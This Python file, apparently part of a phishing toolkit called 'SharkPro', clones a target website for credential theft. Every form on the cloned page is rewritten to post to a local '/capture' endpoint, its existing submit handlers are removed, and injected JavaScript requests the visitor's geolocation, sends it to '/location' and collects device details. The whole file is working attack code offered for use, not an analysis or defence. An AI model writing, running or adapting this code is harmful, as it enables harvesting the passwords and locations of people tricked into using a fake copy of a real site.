#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SharkPro v3.0 - Website Cloner
Clone any website with form capture injection
"""

import os
import sys
import re
import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config import *

class WebsiteCloner:
    """Clone websites and modify forms for credential capture"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        self.downloaded = set()
    
    def clone(self, url, output_dir=SERVER_DIR):
        """
        Clone a website
        
        Args:
            url: Target URL to clone
            output_dir: Where to save the cloned site
        
        Returns:
            bool: Success or failure
        """
        print(f"{Y}[*] Cloning {url}...{NC}")
        
        try:
            # Fetch the page
            response = self.session.get(url, timeout=15)
            response.raise_for_status()
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Modify forms to capture data
            self._modify_forms(soup)
            
            # Download linked resources
            self._download_resources(soup, url, output_dir)
            
            # Inject capture script
            self._inject_capture_script(soup)
            
            # Save modified HTML
            os.makedirs(output_dir, exist_ok=True)
            index_path = os.path.join(output_dir, "index.html")
            
            with open(index_path, 'w', encoding='utf-8') as f:
                f.write(str(soup))
            
            print(f"{G}[✓] Website cloned to {index_path}{NC}")
            return True
            
        except requests.exceptions.RequestException as e:
            print(f"{R}[!] Network error: {e}{NC}")
            return False
        except Exception as e:
            print(f"{R}[!] Clone error: {e}{NC}")
            return False
    
    def _modify_forms(self, soup):
        """Modify all forms to POST to /capture"""
        forms = soup.find_all('form')
        
        for form in forms:
            # Set action to capture endpoint
            form['action'] = '/capture'
            form['method'] = 'POST'
            
            # Remove any existing onsubmit handlers
            if form.get('onsubmit'):
                del form['onsubmit']
    
    def _download_resources(self, soup, base_url, output_dir):
        """Download CSS, JS, and images"""
        
        # Create subdirectories
        css_dir = os.path.join(output_dir, 'css')
        js_dir = os.path.join(output_dir, 'js')
        img_dir = os.path.join(output_dir, 'img')
        
        for d in [css_dir, js_dir, img_dir]:
            os.makedirs(d, exist_ok=True)
        
        # Download CSS files
        for link in soup.find_all('link', rel='stylesheet'):
            href = link.get('href')
            if href:
                content = self._fetch_resource(base_url, href)
                if content:
                    filename = self._get_filename(href, 'css')
                    filepath = os.path.join(css_dir, filename)
                    with open(filepath, 'wb') as f:
                        f.write(content)
                    link['href'] = f'css/{filename}'
        
        # Download JS files
        for script in soup.find_all('script', src=True):
            src = script.get('src')
            if src:
                content = self._fetch_resource(base_url, src)
                if content:
                    filename = self._get_filename(src, 'js')
                    filepath = os.path.join(js_dir, filename)
                    with open(filepath, 'wb') as f:
                        f.write(content)
                    script['src'] = f'js/{filename}'
        
        # Download images
        for img in soup.find_all('img'):
            src = img.get('src')
            if src and not src.startswith('data:'):
                content = self._fetch_resource(base_url, src)
                if content:
                    filename = self._get_filename(src, 'img')
                    filepath = os.path.join(img_dir, filename)
                    with open(filepath, 'wb') as f:
                        f.write(content)
                    img['src'] = f'img/{filename}'
    
    def _fetch_resource(self, base_url, path):
        """Fetch a resource"""
        try:
            url = urljoin(base_url, path)
            if url in self.downloaded:
                return None
            
            self.downloaded.add(url)
            response = self.session.get(url, timeout=10)
            
            if response.status_code == 200:
                return response.content
            return None
            
        except Exception as e:
            print(f"{Y}[!] Failed to download {path}: {e}{NC}")
            return None
    
    def _get_filename(self, url, fallback_ext):
        """Extract filename from URL"""
        parsed = urlparse(url)
        filename = os.path.basename(parsed.path)
        
        if not filename or '.' not in filename:
            # Generate name from hash
            import hashlib
            filename = f"resource_{hashlib.md5(url.encode()).hexdigest()[:8]}.{fallback_ext}"
        
        return filename
    
    def _inject_capture_script(self, soup):
        """Inject JavaScript for additional data capture"""
        script = soup.new_tag('script')
        script.string = """
        // Capture additional data before form submit
        document.addEventListener('DOMContentLoaded', function() {
            // Try to get geolocation
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(pos) {
                    fetch('/location', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                        body: 'lat=' + pos.coords.latitude + 
                              '&lon=' + pos.coords.longitude +
                              '&accuracy=' + pos.coords.accuracy
                    });
                });
            }
            
            // Capture device info
            var deviceInfo = {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                screenSize: window.screen.width + 'x' + window.screen.height,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        });
        """
        
        if soup.head:
            soup.head.append(script)
        else:
            soup.insert(0, script)


if __name__ == "__main__":
    cloner = WebsiteCloner()
    cloner.clone("https://example.com")